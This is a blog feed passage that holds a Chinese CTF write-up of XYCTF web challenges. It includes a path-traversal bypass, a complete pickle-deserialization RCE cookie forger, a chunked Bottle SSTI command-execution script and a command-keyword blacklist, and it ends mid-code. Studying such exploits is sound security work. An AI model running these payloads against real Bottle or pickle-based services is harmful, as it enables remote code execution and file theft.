6a83a62c55b6722325c548d6e6cd2fb33f6b4cdbea75ad2c20a572710c953abc0db3c0b5d4671350e864a780d4e8c12ebf4c3cd68be9718a713fd01497ff7499b105413ee68620a2ba7d9fa2574c8bd11529a331273c93b12a5853331065db1feb9aa0f01802fbfdf981d539d572d7870a35c7ca593b39b533fe623439e2fdefe7599a7c7db8e6c03f879dd8718992383a05a8718e4280f3d0bd0c93a1355a0cb11cce4bac73da61eff06314242e36e48078dc21f604194490ff92872432e13507f6e73ebbc1d08b6530d027c94a77646a1ba06bde1667eaa4da68e30f831c8a4bd6418f16c4ae94be3aa674886fb88b508889c01b9014d239b935c2c881d183ef9f28b57f42f271c858b657769851d6cce98a4e0eaac0342cb251893fd8c573990cd112b4584e9c4c06103beb01996a14a11d37a0f0406557ad0e90afa001aaf4c411f25445f4ca7fa7b976112b4e9c556d0976c583b02958730648c85f420ad4b5d3ec5307777881129e382dda45254d22bbe8d94ab26a8f4125928947a36d6982f238ff72d621e1db85f65f89d9c8a1fdf702d5dee4bedcc2e58d4ccf757fdebcc5a753f3d0ee8bee8364ec68a9aeb2c1dd9c4b64a4319414c9fe972698598786b6a122e19b23ad411980dc1e274b4aa05d6a25c7c313d6509ada6020d97b4273c4554993e2ed9d2febb5eabebf5060e2b33880b1acb82ca871ddf33b94c37c14198d13bf85ef94739efe1b440a146598ace5ed7772e68403cf71345b83cd40b2216c5f385b2bd02a44f680a8e7bba58b68bcd56442783477bf07cb66cbed618319a42747a99485ae30dbb0b427493353fefa6df50e9b5e34e1d26e1bec5ea8aa85d46cdb6e34e905763d2f098f36bb5d09658250db2efb4f54e9a2c76e48ba5b85736e0751fd2a867aa065d6829641733e70aaa5c9823abed9b1fe6d32a1926a9e3c0bc5e0af2babf6b51eb42203fb9dee36f93b2bff0b648b22598164b67ff32a0951f6131dd7d64199eea67b6b432fc900d999d65dbc16587c07727abdb902a843c7ecb5326a978aa6e4c0ca6fa0f238df68fc22b16e5afb1d318b07cb3a70b56faf3004265c1a8deb2ae370087bab0412f4098ded63822e7ddf0cfc21de266318b54046363046e4b492f1edb95ce5e83910382591b6ef9dacd26472f4aa68ab47f5aef0586404c97bffa178d268fa11d460f6d0786d42977597b5f2957e68931cec29ca630d75cbcfbd52e73b918e277f462282298473afa89b01a9f665c4feb151f5386798a7e0df905216a389f2731f8f40fb7eaca62140266cdc838c2707e4b16c34dabd33844640770b292cec18b8c23b2ae95d76f9f65413dae791a5e1d55e98ee1add6ca28f5a157d2494bd7b168a9493c8893f240dad77e9ebc1e4c383a7d24a8ad436248be97e7e1ba2576028534dc6889aedd4972d37c8379b9f206ee00010d355145aaf7268d264aec466b067474e3ab447247a17ab521e1fc8d32a05ff7a4530f9d3b233b14ca4f986a8b9b3d9ff056a79ce0490d517de975f8f94313c03850b9e66e48461e32a9019c58caf51f2571887ff367af56c3342ae3d400f3f1dbbe494bcf01e2e3a4bccd9e3d85a999a02b388bbd22656ac5b1068ffd34c111c042bac90e22e26500f0f2bbd1a3f0c464edd3145d4384ab9fcba8ccd9421c0de4ad8ebc8e0ebba89eba313ced46d4464ffdcc027f2e745a41e242470394203a3db104f158e1935f199907d44610a6dcb4481c4a8191d21d3ebc80b2a6a3c2b5aafd3841cea8ea2a1a5b0cc3e20ee12f566082b2a4c9ddd060ba3cb4ab4db583a34bee8884dca3f95be3cc836bbd8ea593a6201851948afb41349e7f062f35970535366bcf1254f305f079e9b8c394afd161d4d64c2f41feb39db7b30bbd89a62a903f4299529b7dc694591c08006e31fe1386f93d8623e0eb17e4040ea90a9952592f8cab763b3bf879082284787ee02a1db61ed0c37e8c6b5aee44fb18d250030a3597a356f549679b7c1d50e617f3bcb3f739f1f207cf19dbc126eb0d78afa51cd2007d569aebb4d47b977a05869b208ac90c8ab7ec40702f1361383269eb291dd9eb6b87f43b1cba056f2f63cd8f3998aec50939c1a417657295f4b334b1ff2738ff5528540c48457917ce88724a8b8529a79377aef184e042d9c6cf3e1b09e5fc710aa9bf965989ebb7365b4195f7d61773813cab127f12c441477dce7cf423ddec9b1f8aa16371106421e9df36699ee38925929699e5309914af680d97c71f3062bdd7275515ec09594414b3a66026e6683f811bed6b9f092facfcfba0cfc0ee89182110e2640d9cd30dcc8e5073741cf966821c1a8d56a2d1be6e2d460dc5a0d1b2cfabf973323e066a31f9d0c3bfddce12245aac91d3f7cc2a3e324af6b85583d562e9e25584cb3731bc4ffc709b92685eb35738cee3da24c859bb6f47a8c15422eb7e9a9763a67eb511fe14691d33e1dffed1713da2932a6c6f4800cfe5df859f3d6cb3baec28bf53187b5f8201f4534ce85bc4bae913cba6777941f7462eed6f8304ff720c350484f1c7332ae2884fa74109df97fbef639056bdc82c4ecdc04cc885853e6e6e3e6733ed6114f4ddeb5c469d08a4019706d20a137e27b992245e8895abcbbefa68f90a69087c0fc77dcfb2de6e5cc2c2e543a437a44a241163edb7a5307d91e330289c62388bf340cb309dc808bb527c4ff757ae219854076bece0041d05efa75fd4bc1b9f2e21d7ad02cb8cf394ee3dda31d561587c8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTFå¤ç°åŠæ€è€ƒ</title>
    <link href="/2025/04/09/XYCTF%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%80%9D%E8%80%83/"/>
    <url>/2025/04/09/XYCTF%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>Bottleå¼•å…¥äº†pickleï¼Œé‰´æƒçš„æ—¶å€™ç”¨pickleååºåˆ—åŒ–äº†sessionã€‚åªè¦çŸ¥é“äº†å¯†é’¥å°±å¯ä»¥ä»»æ„ååºåˆ—åŒ–</p><p>æºç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        secret = f.read()<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No secret file found, using default secret&quot;</span>)<br>    secret = <span class="hljs-string">&quot;secret&quot;</span><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="è·¯å¾„ç©¿è¶Š"><a href="#è·¯å¾„ç©¿è¶Š" class="headerlink" title="è·¯å¾„ç©¿è¶Š"></a>è·¯å¾„ç©¿è¶Š</h3><p>åœ¨downloadè·¯ç”±ä¸‹å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä½¿ç”¨<code>./</code>ç»•è¿‡è¿‡æ»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/download?filename=./</span>..<span class="hljs-regexp">/./</span>..<span class="hljs-regexp">/./</span>../secret.txt<br></code></pre></td></tr></table></figure><p>è¯»å–åˆ°secret.txt</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">Hell0_H@</span><span class="hljs-symbol">cker_Y0u_A3r_Sm@</span>r7<br></code></pre></td></tr></table></figure><h3 id="pickleååºåˆ—åŒ–"><a href="#pickleååºåˆ—åŒ–" class="headerlink" title="pickleååºåˆ—åŒ–"></a>pickleååºåˆ—åŒ–</h3><p>ååºåˆ—åŒ–çš„ç¤ºä¾‹åƒå»å¹´çš„<code>SekaiCTF 2022</code>çš„<code>Bottle Poem</code></p><p>æˆ‘ä»¬æ¥çœ‹get_cookieçš„é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">self, key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span><br><span class="hljs-string">        `secret` must match the one used to create the cookie (see</span><br><span class="hljs-string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span><br><span class="hljs-string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span><br>    value = <span class="hljs-variable language_">self</span>.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret:<br>        <span class="hljs-comment"># See BaseResponse.set_cookie for details on signed cookies.</span><br>        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value.startswith(<span class="hljs-string">&#x27;!&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">in</span> value:<br>            sig, msg = <span class="hljs-built_in">map</span>(tob, value[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()<br>            <span class="hljs-keyword">if</span> _lscmp(sig, base64.b64encode(<span class="hljs-built_in">hash</span>)):<br>                dst = pickle.loads(base64.b64decode(msg))<br>                <span class="hljs-keyword">if</span> dst <span class="hljs-keyword">and</span> dst[<span class="hljs-number">0</span>] == key:<br>                    <span class="hljs-keyword">return</span> dst[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªè¦ç­¾åå¯¹çš„ä¸Šå°±èƒ½ç›´æ¥è¿›pickleçš„ååºåˆ—åŒ–ã€‚</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os, hmac, hashlib, base64, pickle, requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tob</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s.encode(enc)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span> <span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytes</span>(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touni</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span>, err=<span class="hljs-string">&#x27;strict&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s.decode(enc, err)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_cookie</span>(<span class="hljs-params">name, value, secret</span>):<br>    d = pickle.dumps([name, value], -<span class="hljs-number">1</span>)<br>    encoded = base64.b64encode(d)<br>    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.sha256).digest())<br>    value = touni(tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + encoded)<br>    <span class="hljs-keyword">return</span> value<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PickleRCE</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">from bottle import response</span><br><span class="hljs-string">import subprocess,base64</span><br><span class="hljs-string">output = subprocess.check_output(&#x27;cat /flag_dda2d465-af33-4c56-8cc9-fd4306867b70&#x27;, shell=True)</span><br><span class="hljs-string">response.set_header(&#x27;X-Flag&#x27;,base64.b64encode(output))</span><br><span class="hljs-string">&quot;&quot;&quot;</span>,))<br><br>session = &#123;<span class="hljs-string">&quot;name&quot;</span>: PickleRCE()&#125;<br>cookie = create_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>)<br><br>r = requests.get(<span class="hljs-string">&quot;http:&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;name&quot;</span>: cookie&#125;)<br><span class="hljs-built_in">print</span>(base64.b64decode(r.headers[<span class="hljs-string">&quot;x-flag&quot;</span>]).decode(<span class="hljs-string">&quot;ascii&quot;</span>))<br></code></pre></td></tr></table></figure><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>ä¸è¦ä½¿ç”¨ååºåˆ—åŒ–çš„æ–¹å¼æ¥è¯»å–sessionï¼Œé¿å…å±å®³ï¼Œä½¿ç”¨ä¸€äº›ç®€å•çš„åƒjsonè¿™æ ·æ¥è¯»å–ï¼Œå†…éƒ¨é‰´æƒğŸ˜ŠğŸ¤“</p><h2 id="å‡ºé¢˜äººå·²ç–¯"><a href="#å‡ºé¢˜äººå·²ç–¯" class="headerlink" title="å‡ºé¢˜äººå·²ç–¯"></a>å‡ºé¢˜äººå·²ç–¯</h2><p>åƒæ˜¯VNçš„é‚£åˆ°<code>SSTI</code>ï¼Œä½†æ˜¯é™åˆ¶äº†é•¿åº¦ï¼Œè¿˜é™åˆ¶çš„å¾ˆæ­»ï¼Œå‘œå‘œå‘œ</p><p>æºç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>å¸¸è§„æ€è·¯çš„sstiæ‰“æ³•å®Œå…¨ä¸è¡Œï¼Œé™åˆ¶çš„å¤ªæ­»äº†ğŸ¤“ğŸ¤“ğŸ¤“ğŸ¤“</p><p>çœ‹åˆ°å®˜æ–¹wpè§£é‡Šä½¿ç”¨ï¼Œå…¶å®bottleçš„SSTIå¯ä»¥ç›´æ¥è®¿é—®åˆ°å†…éƒ¨ç±»ã€‚æ‰€ä»¥æ˜“å¾—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack&#x27;</span><br><br><br>payload = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><br><br>p = [payload[i:i+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),<span class="hljs-number">3</span>)]<br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:tmp&#125;)<br><br>r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p>ç›´æ¥å¾€osé‡Œå¡å­—ç¬¦ã€‚éšåä¸€èµ·æ‹¿å‡ºæ¥execã€‚è¿™æ ·å­å°±å¯ä»¥å®ç°SSTIã€‚</p><h3 id="æ€è€ƒ-1"><a href="#æ€è€ƒ-1" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>é‡åˆ°è¿™ç§æ–°çš„sstiçš„é¢˜ç›®ï¼Œä¸èƒ½ä»…ä»…å±€é™åˆ°åŸå§‹çš„<code>ssti</code>é“¾å­ï¼Œè¦å»ç¿»ä¸€ä¸‹æ¡†æ¶çš„æºç ï¼Œå»äº†è§£ä¸€ä¸‹æ–°çš„æ€è·¯</p><h2 id="å‡ºé¢˜äººåˆç–¯"><a href="#å‡ºé¢˜äººåˆç–¯" class="headerlink" title="å‡ºé¢˜äººåˆç–¯"></a>å‡ºé¢˜äººåˆç–¯</h2><p>åœ¨<code>å‡ºé¢˜äººå·²ç–¯</code>çš„åŸºç¡€ä¸Šç¦æ­¢äº†æ›´å¤šçš„å­—ç¬¦ã€‚è¿™ä¸‹æ²¡æ³•ç”¨ä¹‹å‰çš„æ–¹æ³•åšäº†</p><p>çœ‹äº†**<code>LamentXU</code>**çš„æ–°æ€è·¯ï¼Œæˆ‘é ï¼Œå¤ªå±Œäº†ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><p>æºç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> <br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span 